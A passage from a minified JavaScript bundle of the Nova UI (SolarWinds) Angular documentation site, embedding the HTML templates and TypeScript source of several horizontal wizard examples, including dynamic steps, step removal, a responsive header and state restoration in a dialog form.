WizardDocsComponent {}\n'},42721:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-wizard-horizontal #wizardComponent>\n    \x3c!--Static step--\x3e\n    <nui-wizard-step-v2 i18n-label label="Normal step">\n        <div class="p-5">\n            <p i18n>Hi! You can add next step dynamically</p>\n\n            <button\n                nui-button\n                type="button"\n                (click)="addStep(dynamicTemplate2)"\n            >\n                Add dynamic step w/template\n            </button>\n        </div>\n\n        <ng-template nuiWizardStepFooter>\n            <ng-container *ngTemplateOutlet="wizardCancel"></ng-container>\n            <ng-container *ngTemplateOutlet="wizardNext"></ng-container>\n        </ng-template>\n    </nui-wizard-step-v2>\n\n    <nui-wizard-step-v2\n        *ngIf="enableDynamicStepWithButton"\n        i18n-label\n        label="Added dynamically"\n    >\n        <ng-template nuiWizardStepLabel>Dynamic w/button</ng-template>\n        <p class="m-5" i18n>\n            Hi! I\'m dynamic step that can be enabled/disabled programmatically\n            via the toggle button under the wizard!\n        </p>\n\n        <ng-template nuiWizardStepFooter>\n            <ng-container *ngTemplateOutlet="wizardCancel"></ng-container>\n            <ng-container *ngTemplateOutlet="wizardPrevious"></ng-container>\n            <ng-container *ngTemplateOutlet="wizardNext"></ng-container>\n        </ng-template>\n    </nui-wizard-step-v2>\n\n    <ng-container\n        *ngTemplateOutlet="dynamicStepWithTemplate"\n        ngProjectAs="nui-wizard-step-v2"\n    ></ng-container>\n    <ng-template #dynamicStepWithTemplate>\n        <nui-wizard-step-v2>\n            <ng-template nuiWizardStepLabel>Dynamic w/template</ng-template>\n            <p class="m-5" i18n>Hi! I\'m dynamic step added automatically!</p>\n\n            <ng-template nuiWizardStepFooter>\n                <ng-container *ngTemplateOutlet="wizardCancel"></ng-container>\n                <ng-container *ngTemplateOutlet="wizardPrevious"></ng-container>\n                <ng-container *ngTemplateOutlet="wizardNext"></ng-container>\n            </ng-template>\n        </nui-wizard-step-v2>\n    </ng-template>\n\n    <nui-wizard-step-v2 *ngFor="let step of steps; let isLast = last">\n        <ng-template nuiWizardStepLabel>{{ step.title }}</ng-template>\n        <ng-container *ngTemplateOutlet="step.templateRef"></ng-container>\n        <ng-template nuiWizardStepFooter>\n            <ng-container *ngTemplateOutlet="wizardCancel"></ng-container>\n            <ng-container *ngTemplateOutlet="wizardPrevious"></ng-container>\n            <ng-container\n                *ngTemplateOutlet="!isLast && wizardNext"\n            ></ng-container>\n            <ng-container *ngIf="isLast && i >= 1">\n                <button\n                    type="button"\n                    displayStyle="primary"\n                    nui-button\n                    (click)="finishWizard()"\n                    i18n\n                >\n                    Finish\n                </button>\n            </ng-container>\n        </ng-template>\n    </nui-wizard-step-v2>\n\n    <ng-template #dynamicTemplate1>\n        <p class="m-5" i18n>\n            Hi! I\'m dynamic step added automatically during ngAfterViewInit of\n            this wizard using a TemplateRef!\n        </p>\n    </ng-template>\n\n    <ng-template #dynamicTemplate2>\n        <p class="m-5" i18n>\n            Hi! I\'m a step added dynamically using a TemplateRef by clicking a\n            button from the first step !\n        </p>\n    </ng-template>\n\n    <ng-template #wizardCancel>\n        <button\n            type="button"\n            displayStyle="action"\n            nui-button\n            (click)="resetWizard()"\n            i18n\n        >\n            Cancel\n        </button>\n    </ng-template>\n\n    <ng-template #wizardPrevious>\n        <button type="button" nuiWizardPrevious nui-button icon="caret-left">\n            Back\n        </button>\n    </ng-template>\n\n    <ng-template #wizardNext>\n        <button\n            nuiWizardNext\n            type="button"\n            nui-button\n            displayStyle="primary"\n            icon="caret-right"\n            iconRight="true"\n        >\n            Next\n        </button>\n    </ng-template>\n</nui-wizard-horizontal>\n<div>\n    <button nui-button type="button" (click)="toggleStep()">\n        {{ !enableDynamicStepWithButton ? "Enable" : "Disable" }} dynamic step\n        w/button\n    </button>\n</div>\n'},67469:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport {\n    AfterViewInit,\n    Component,\n    TemplateRef,\n    ViewChild,\n} from "@angular/core";\n\nimport { ToastService, WizardHorizontalComponent } from "@nova-ui/bits";\n\ninterface IWizardStepData {\n    title: string;\n    templateRef: TemplateRef<string>;\n}\n\n@Component({\n    selector: "nui-wizard-dynamic-example",\n    templateUrl: "./wizard-dynamic.example.component.html",\n})\nexport class WizardDynamicExampleComponent implements AfterViewInit {\n    public enableDynamicStepWithButton = false;\n    public steps: IWizardStepData[] = [];\n\n    @ViewChild("dynamicTemplate1") dynamicTemplate1: TemplateRef<string>;\n    @ViewChild("wizardComponent") private wizard: WizardHorizontalComponent;\n\n    constructor(private toastService: ToastService) {}\n\n    public ngAfterViewInit(): void {\n        this.addStep(this.dynamicTemplate1, $localize`My first dynamic step`);\n    }\n\n    public toggleStep(): void {\n        this.enableDynamicStepWithButton = !this.enableDynamicStepWithButton;\n    }\n\n    public addStep(templateRef: TemplateRef<string>, title?: string): void {\n        this.steps.push({\n            title: title ?? `Dynamic Step ${this.steps.length + 1}`,\n            templateRef: templateRef,\n        });\n    }\n\n    public resetWizard(): void {\n        this.wizard.reset();\n    }\n\n    public finishWizard(): void {\n        this.toastService.success({\n            title: $localize`Success`,\n            message: $localize`Wizard was completed successfully`,\n            options: {\n                timeOut: 2000,\n            },\n        });\n    }\n}\n'},99705:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-wizard-horizontal #wizard>\n    \x3c!--  content of the 1st step --\x3e\n    <nui-wizard-step-v2 i18n-label label="First step">\n        \x3c!-- content of the current step --\x3e\n        <div class="p-5">\n            <span i18n>This is the first step of our horizontal wizard</span>\n        </div>\n\n        \x3c!-- content of the footer --\x3e\n        <ng-template nuiWizardStepFooter>\n            <ng-container *ngTemplateOutlet="wizardCancel"></ng-container>\n            <ng-container *ngTemplateOutlet="wizardNext"></ng-container>\n        </ng-template>\n    </nui-wizard-step-v2>\n\n    \x3c!--  content of the final step --\x3e\n    <nui-wizard-step-v2 i18n-label label="Final step">\n        <div class="p-5">\n            <span i18n>We finally reached our last step!</span>\n        </div>\n        \x3c!-- Notice how both label and footer can be placed anywhere in the content of wizard step --\x3e\n        <ng-template nuiWizardStepFooter>\n            <ng-container *ngTemplateOutlet="wizardCancel"></ng-container>\n            <ng-container *ngTemplateOutlet="wizardPrevious"></ng-container>\n            <button\n                type="button"\n                displayStyle="primary"\n                nui-button\n                (click)="finishWizard()"\n                i18n\n            >\n                Finish\n            </button>\n        </ng-template>\n    </nui-wizard-step-v2>\n\n    <ng-template #wizardCancel>\n        <button\n            type="button"\n            displayStyle="action"\n            nui-button\n            (click)="resetWizard()"\n            i18n\n        >\n            Cancel\n        </button>\n    </ng-template>\n\n    <ng-template #wizardPrevious>\n        <button type="button" nuiWizardPrevious nui-button icon="caret-left">\n            Back\n        </button>\n    </ng-template>\n\n    <ng-template #wizardNext>\n        <button\n            nuiWizardNext\n            type="button"\n            nui-button\n            displayStyle="primary"\n            icon="caret-right"\n            iconRight="true"\n        >\n            Next\n        </button>\n    </ng-template>\n</nui-wizard-horizontal>\n'},18229:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component, ViewChild } from "@angular/core";\n\nimport { ToastService, WizardHorizontalComponent } from "@nova-ui/bits";\n\n@Component({\n    selector: "nui-wizard-horizontal-example",\n    templateUrl: "./wizard-horizontal.example.component.html",\n})\nexport class WizardHorizontalExampleComponent {\n    @ViewChild("wizard") private wizard: WizardHorizontalComponent;\n\n    constructor(private toastService: ToastService) {}\n\n    public resetWizard(): void {\n        this.wizard.reset();\n    }\n\n    public finishWizard(): void {\n        this.toastService.success({\n            title: $localize`Success`,\n            message: $localize`Wizard was completed successfully`,\n            options: {\n                timeOut: 2000,\n            },\n        });\n    }\n}\n'},95729:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-wizard-horizontal #wizard>\n    <nui-wizard-step-v2\n        *ngFor="let step of steps; let i = index; let isLast = last"\n    >\n        <ng-template nuiWizardStepLabel>{{\n            step.title + " (" + i + ")"\n        }}</ng-template>\n        <ng-container *ngTemplateOutlet="step.templateRef"></ng-container>\n        <ng-template nuiWizardStepFooter>\n            <ng-container *ngIf="!isLast || i >= 1">\n                <button\n                    type="button"\n                    displayStyle="action"\n                    nui-button\n                    (click)="resetWizard()"\n                    i18n\n                >\n                    Cancel\n                </button>\n            </ng-container>\n            <ng-container *ngIf="i !== 0">\n                <button\n                    type="button"\n                    nuiWizardPrevious\n                    nui-button\n                    icon="caret-left"\n                >\n                    Back\n                </button>\n            </ng-container>\n            <ng-container *ngIf="!isLast">\n                <button\n                    nuiWizardNext\n                    type="button"\n                    nui-button\n                    displayStyle="primary"\n                    icon="caret-right"\n                    iconRight="true"\n                >\n                    Next\n                </button>\n            </ng-container>\n            <ng-container *ngIf="isLast && i >= 1">\n                <button\n                    type="button"\n                    displayStyle="primary"\n                    nui-button\n                    (click)="finishWizard()"\n                    i18n\n                >\n                    Finish\n                </button>\n            </ng-container>\n        </ng-template>\n    </nui-wizard-step-v2>\n\n    <ng-template #dynamicStep>\n        <p class="m-5" i18n>\n            Hi! I\'m a step added dynamically using a TemplateRef by clicking a\n            button from the first step !\n        </p>\n    </ng-template>\n\n    <ng-template #normalStep>\n        <div class="p-5">\n            <p i18n>Hi! You can add next step dynamically</p>\n\n            <button nui-button type="button" (click)="addStep(dynamicStep)">\n                Add dynamic step w/template\n            </button>\n        </div>\n    </ng-template>\n</nui-wizard-horizontal>\n<div class="d-flex">\n    <div class="">\n        <span class="nui-textbox--bold" [ngStyle]="{ \'font-weight\': \'bold\' }"\n            >Step index to remove</span\n        >\n        <br />\n        <nui-textbox-number [minValue]="1" #number></nui-textbox-number>\n    </div>\n    <button\n        class="ml-3 h-25 align-self-end"\n        displayStyle="destructive"\n        nui-button\n        type="button"\n        [disabled]="+number.value < 1"\n        (click)="removeStep(+number.value)"\n        i18n\n    >\n        Remove step dynamically\n    </button>\n</div>\n'},93245:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport {\n    AfterViewInit,\n    Component,\n    TemplateRef,\n    ViewChild,\n} from "@angular/core";\n\nimport { ToastService, WizardHorizontalComponent } from "@nova-ui/bits";\n\ninterface IWizardStepData {\n    title: string;\n    templateRef: TemplateRef<string>;\n}\n\n@Component({\n    selector: "nui-wizard-remove-step-example",\n    templateUrl: "./wizard-remove-step.example.component.html",\n})\nexport class WizardRemoveStepExampleComponent implements AfterViewInit {\n    public steps: IWizardStepData[] = [];\n\n    @ViewChild("normalStep") normalStep: TemplateRef<string>;\n    @ViewChild("wizard") private wizard: WizardHorizontalComponent;\n\n    constructor(private toastService: ToastService) {}\n\n    public ngAfterViewInit(): void {\n        this.addStep(this.normalStep, $localize`Normal step`);\n    }\n\n    public addStep(templateRef: TemplateRef<string>, title?: string): void {\n        this.steps.push({\n            title: title ?? `Dynamic Step`,\n            templateRef: templateRef,\n        });\n    }\n\n    public removeStep(index: number): void {\n        this.steps.splice(index, 1);\n    }\n\n    public resetWizard(): void {\n        this.wizard.reset();\n    }\n\n    public finishWizard(): void {\n        this.toastService.success({\n            title: $localize`Success`,\n            message: $localize`Wizard was completed successfully`,\n            options: {\n                timeOut: 2000,\n            },\n        });\n    }\n}\n'},14879:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-wizard-horizontal #nuiWizard>\n    <ng-container *ngFor="let step of steps; let i = index">\n        <nui-wizard-step-v2 i18n-label [label]="\'Step \' + (i + 1)">\n            <div class="m-5">\n                <span i18n>This is the step #{{ i + 1 }}</span\n                >.\n            </div>\n            <ng-template nuiWizardStepFooter>\n                <ng-container *ngTemplateOutlet="wizardCancel"></ng-container>\n                <ng-container *ngIf="i">\n                    <ng-container\n                        *ngTemplateOutlet="wizardPrevious"\n                    ></ng-container>\n                </ng-container>\n                <ng-container *ngIf="i !== steps.length - 1">\n                    <ng-container *ngTemplateOutlet="wizardNext"></ng-container>\n                </ng-container>\n                <ng-container *ngIf="i === steps.length - 1">\n                    <ng-container\n                        *ngTemplateOutlet="wizardFinish"\n                    ></ng-container>\n                </ng-container>\n            </ng-template>\n        </nui-wizard-step-v2>\n    </ng-container>\n\n    <ng-template #wizardPrevious>\n        <button type="button" nuiWizardPrevious nui-button icon="caret-left">\n            Back\n        </button>\n    </ng-template>\n\n    <ng-template #wizardNext>\n        <button\n            nuiWizardNext\n            type="button"\n            nui-button\n            displayStyle="primary"\n            icon="caret-right"\n            iconRight="true"\n        >\n            Next\n        </button>\n    </ng-template>\n\n    <ng-template #wizardCancel>\n        <button\n            type="button"\n            nui-button\n            displayStyle="action"\n            (click)="reset(); notifyOnCancel()"\n        >\n            Cancel\n        </button>\n    </ng-template>\n\n    <ng-template #wizardFinish>\n        <button\n            type="button"\n            nui-button\n            displayStyle="primary"\n            (click)="notifyOnFinished()"\n        >\n            Finish\n        </button>\n    </ng-template>\n</nui-wizard-horizontal>\n'},95239:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component, ViewChild } from "@angular/core";\n\nimport { ToastService, WizardHorizontalComponent } from "@nova-ui/bits";\n\n@Component({\n    selector: "nui-wizard-responsive-header-example",\n    templateUrl: "./wizard-responsive-header.example.component.html",\n})\nexport class WizardResponsiveHeaderExampleComponent {\n    public steps: Array<any> = Array.from({ length: 20 });\n\n    @ViewChild("nuiWizard") public wizard: WizardHorizontalComponent;\n\n    constructor(private toast: ToastService) {}\n\n    public reset(): void {\n        this.wizard.reset();\n    }\n\n    public notifyOnFinished(): void {\n        this.toast.info({\n            title: "Finished!",\n            message: "You have completed the wizard",\n        });\n    }\n\n    public notifyOnCancel(): void {\n        this.toast.warning({\n            title: "Cancelled!",\n            message:\n                "You\'ve hit the wizard\'s \'Cancel\' button! The wizard is now restored to its initial state.",\n        });\n    }\n}\n'},12047:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<ng-template #dialogWizard>\n    <nui-dialog-header\n        i18n-title\n        title="Restore Wizard State"\n        (closed)="closeDialog()"\n    >\n    </nui-dialog-header>\n    <form class="dialog-body compact-mode" [formGroup]="form" *ngIf="form">\n        <nui-wizard-horizontal [state]="state" (finished)="saveState($event)">\n            <nui-wizard-step-v2\n                label="Person Details"\n                formGroupName="personDetails"\n                [stepControl]="form.get([\'personDetails\'])"\n            >\n                <div class="px-5 pb-5">\n                    <nui-form-field\n                        [control]="form.get([\'personDetails\', \'name\'])"\n                        class="d-block mb-4 mt-4"\n                        i18n-caption\n                        caption="Name"\n                    >\n                        <nui-textbox formControlName="name"></nui-textbox>\n                        <nui-validation-message\n                            for="required"\n                            *ngIf="\n                                form.get([\'personDetails\', \'name\'])?.errors\n                                    ?.required\n                            "\n                            i18n\n                        >\n                            This is required\n                        </nui-validation-message>\n                    </nui-form-field>\n\n                    <nui-form-field\n                        [control]="form.get([\'personDetails\', \'privacy\'])"\n                    >\n                        <nui-checkbox formControlName="privacy" [value]="true">\n                            Privacy Policy\n                        </nui-checkbox>\n\n                        <nui-validation-message\n                            for="required"\n                            *ngIf="\n                                form.get([\'personDetails\', \'privacy\'])?.errors\n                                    ?.required\n                            "\n                            i18n\n                        >\n                            This is required\n                        </nui-validation-message>\n                    </nui-form-field>\n                </div>\n\n                <ng-template nuiWizardStepFooter>\n                    <ng-container\n                        *ngTemplateOutlet="wizardCancel"\n                    ></ng-container>\n                    <ng-container\n                        *ngTemplateOutlet="\n                            wizardNext;\n                            context: { form: \'personDetails\' }\n                        "\n                    ></ng-container>\n                </ng-template>\n            </nui-wizard-step-v2>\n\n            <nui-wizard-step-v2\n                label="Organization"\n                formGroupName="organization"\n                [stepControl]="form.get([\'organization\'])"\n            >\n                <div class="p-5">\n                    <nui-form-field\n                        [control]="form.get([\'organization\', \'title\'])"\n                        class="d-block mb-4"\n                        i18n-caption\n                        caption="Organization"\n                    >\n                        <nui-textbox formControlName="title"></nui-textbox>\n                        <nui-validation-message\n                            for="required"\n                            *ngIf="\n                                form.get([\'organization\', \'title\'])?.errors\n                                    ?.required\n                            "\n                            i18n\n                        >\n                            This is required\n                        </nui-validation-message>\n                    </nui-form-field>\n                    <nui-form-field\n                        caption="Date"\n                        class="d-block mb-4"\n                        [control]="form.get([\'organization\', \'date\'])"\n                    >\n                        <nui-date-picker\n                            formControlName="date"\n                            i18n\n                        ></nui-date-picker>\n                        <nui-validation-message\n                            for="required"\n                            *ngIf="\n                                form.get([\'organization\', \'date\'])?.errors\n                                    ?.required\n                            "\n                            i18n\n                        >\n                            This is required\n                        </nui-validation-message>\n                    </nui-form-field>\n                    <nui-form-field\n                        [control]="\n                            form.get([\'organization\', \'createDynamicStep1\'])\n                        "\n                        class="d-block"\n                    >\n                        <nui-checkbox\n                            formControlName="createDynamicStep1"\n                            [value]="true"\n                        >\n                            Add first step dynamically\n                        </nui-checkbox>\n                    </nui-form-field>\n                    <nui-form-field\n                        [control]="\n                            form.get([\'organization\', \'createDynamicStep2\'])\n                        "\n                        class="d-block"\n                    >\n                        <nui-checkbox\n                            formControlName="createDynamicStep2"\n                            [value]="true"\n                        >\n                            Add second step dynamically\n                        </nui-checkbox>\n                    </nui-form-field>\n                </div>\n\n                <ng-template nuiWizardStepFooter>\n                    <ng-container\n                        *ngTemplateOutlet="wizardCancel"\n                    ></ng-container>\n                    <ng-container\n                        *ngTemplateOutlet="wizardPrevious"\n                    ></ng-container>\n                    <ng-container\n                        *ngTemplateOutlet="\n                            wizardNext;\n                            context: { form: \'organization\' }\n                        "\n                    ></ng-container>\n                </ng-template>\n            </nui-wizard-step-v2>\n\n            <nui-wizard-step-v2 *ngFor="let step of dynamicSteps">\n                <ng-template nuiWizardStepLabel>{{ step.title }}</ng-template>\n                <div class="p-5">\n                    <ng-container\n                        *ngTemplateOutlet="step.templateRef"\n                    ></ng-container>\n                </div>\n                <ng-template nuiWizardStepFooter>\n                    <ng-container\n                        *ngTemplateOutlet="wizardPrevious"\n                    ></ng-container>\n                    <ng-container *ngTemplateOutlet="wizardNext"></ng-container>\n                </ng-template>\n            </nui-wizard-step-v2>\n\n            <nui-wizard-step-v2\n                formGroupName="contactDetails"\n                [stepControl]="form.get([\'contactDetails\'])"\n                #finalStep\n            >\n                <ng-template nuiWizardStepLabel>\n                    <span>Contact Details</span>\n                </ng-template>\n\n                <div class="px-5 pb-5">\n                    <nui-form-field\n                        [control]="form.get([\'contactDetails\', \'email\'])"\n                        class="d-block mb-4 mt-4"\n                        i18n-caption\n                        caption="Email"\n                    >\n                        <nui-textbox\n                            type="email"\n                            formControlName="email"\n                        ></nui-textbox>\n                        <nui-validation-message\n                            for="required"\n                            *ngIf="\n                                form.get([\'contactDetails\', \'email\'])?.errors\n                                    ?.required\n                            "\n                            i18n\n                        >\n                            This is required\n                        </nui-validation-message>\n\n                        <nui-validation-message\n                            for="email"\n                            *ngIf="\n                                form.get([\'contactDetails\', \'email\'])?.errors\n                                    ?.email\n                            "\n                            i18n\n                        >\n                            Invalid email\n                        </nui-validation-message>\n                    </nui-form-field>\n\n                    <nui-form-field\n                        caption="Select"\n                        [control]="form.get([\'contactDetails\', \'options\'])"\n                    >\n                        <nui-select-v2 formControlName="options">\n                            <nui-select-v2-option value="Item 1"\n                                >Item 1</nui-select-v2-option\n                            >\n                            <nui-select-v2-option value="Item 2"\n                                >Item 2</nui-select-v2-option\n                            >\n                        </nui-select-v2>\n                    </nui-form-field>\n                </div>\n\n                <ng-template nuiWizardStepFooter>\n                    <button\n                        nui-button\n                        class="btn-reset"\n                        type="button"\n                        icon="reset"\n                        (click)="resetStep(finalStep)"\n                    >\n                        Reset step\n                    </button>\n                    <ng-container\n                        *ngTemplateOutlet="wizardCancel"\n                    ></ng-container>\n                    <ng-container\n                        *ngTemplateOutlet="wizardPrevious"\n                    ></ng-container>\n                    <button\n                        type="button"\n                        nui-button\n                        displayStyle="primary"\n                        (click)="completeWizard(\'contactDetails\', finalStep)"\n                    >\n                        Finish\n                    </button>\n                </ng-template>\n            </nui-wizard-step-v2>\n\n            <ng-template #wizardPrevious>\n                <button\n                    type="button"\n                    nuiWizardPrevious\n                    nui-button\n                    icon="caret-left"\n                >\n                    Back\n                </button>\n            </ng-template>\n\n            <ng-template #wizardNext let-form="form">\n                <button\n                    nuiWizardNext\n                    type="button"\n                    nui-button\n                    displayStyle="primary"\n                    icon="caret-right"\n                    iconRight="true"\n                    (click)="validateStep(form)"\n                >\n                    Next\n                </button>\n            </ng-template>\n\n            <ng-template #wizardCancel>\n                <button\n                    type="button"\n                    nui-button\n                    displayStyle="action"\n                    (click)="closeDialog()"\n                >\n                    Cancel\n                </button>\n            </ng-template>\n        </nui-wizard-horizontal>\n    </form>\n</ng-template>\n\n<ng-template #dynamicTemplate1>\n    <p i18n>\n        Hi! I was created dynamically, because you\'ve checked the checkbox on\n        the previous step! Uncheck it to hide me!\n    </p>\n</ng-template>\n\n<ng-template #dynamicTemplate2>\n    <p i18n>This is another template rendered dynamically!</p>\n    <button type="button" nui-button class="mb-3" (click)="awesome = !awesome">\n        Click if you\'re awesome\n    </button>\n    <nui-message *ngIf="awesome" type="ok">You are awesome!</nui-message>\n</ng-template>\n\n<button nui-button type="button" (click)="openDialog(dialogWizard)" i18n>\n    Open dialog wizard\n</button>\n'},67515:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t=".btn-reset {\n    margin-right: auto;\n}\n"},63639:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport {\n    Component,\n    Inject,\n    OnDestroy,\n    OnInit,\n    TemplateRef,\n    ViewChild,\n} from "@angular/core";\nimport { FormBuilder, Validators } from "@angular/forms";\nimport isEqual from "lodash/isEqual";\nimport { Subject } from "rxjs";\nimport { takeUntil } from "rxjs/operators";\n\nimport {\n    DialogService,\n    IWizardState,\n    NuiDialogRef,\n    ToastService,\n    WizardStepV2Component,\n} from "@nova-ui/bits";\n\ninterface IWizardStepData {\n    title: string;\n    templateRef: TemplateRef<string>;\n}\n\n@Component({\n    selector: "nui-wizard-restore-state-example",\n    templateUrl: "./wizard-restore-state.example.component.html",\n    styleUrls: ["wizard-restore-state.example.component.less"],\n})\nexport class WizardRestoreStateExampleComponent implements OnInit, OnDestroy {\n    public form;\n    public activeDialog: NuiDialogRef;\n    public state: IWizardState;\n    public dynamicSteps: IWizardStepData[] = [];\n    public awesome: boolean = false;\n    @ViewChild("dynamicTemplate1") public template1: TemplateRef<string>;\n    @ViewChild("dynamicTemplate2") public template2: TemplateRef<string>;\n    private readonly destroy$ = new Subject<void>();\n\n    constructor(\n        private formBuilder: FormBuilder,\n        @Inject(DialogService) private dialogService: DialogService,\n        private toastService: ToastService\n    ) {\n        this.form = this.formBuilder.group({\n            personDetails: this.formBuilder.group({\n                name: ["", [Validators.required, Validators.minLength(3)]],\n                privacy: [false, [Validators.requiredTrue]],\n            }),\n            organization: this.formBuilder.group({\n                title: ["", [Validators.required]],\n                date: ["", [Validators.required]],\n                createDynamicStep1: [false],\n                createDynamicStep2: [false],\n            }),\n            contactDetails: this.formBuilder.group({\n                email: ["", [Validators.required, Validators.email]],\n                options: [""],\n            }),\n        });\n    }\n\n    public ngOnInit(): void {\n        this.form\n            .get(["organization", "createDynamicStep1"])\n            ?.valueChanges.pipe(takeUntil(this.destroy$))\n            .subscribe((changes) => {\n                this.handleDynamicSteps(\n                    "I was created dynamically!",\n                    this.template1,\n                    changes\n                );\n            });\n\n        this.form\n            .get(["organization", "createDynamicStep2"])\n            ?.valueChanges.pipe(takeUntil(this.destroy$))\n            .subscribe((changes) => {\n                this.handleDynamicSteps(\n                    "Another dynamic step",\n                    this.template2,\n                    changes\n                );\n            });\n    }\n\n    public ngOnDestroy(): void {\n        this.destroy$.next();\n        this.destroy$.complete();\n    }\n\n    public openDialog(content: TemplateRef<string>): void {\n        this.activeDialog = this.dialogService.open(content, { size: "lg" });\n    }\n\n    public closeDialog(): void {\n        this.activeDialog.close();\n    }\n\n    public saveState(state: IWizardState): void {\n        this.state = state;\n    }\n\n    public completeWizard(\n        formControlName: string,\n        step: WizardStepV2Component\n    ): void {\n        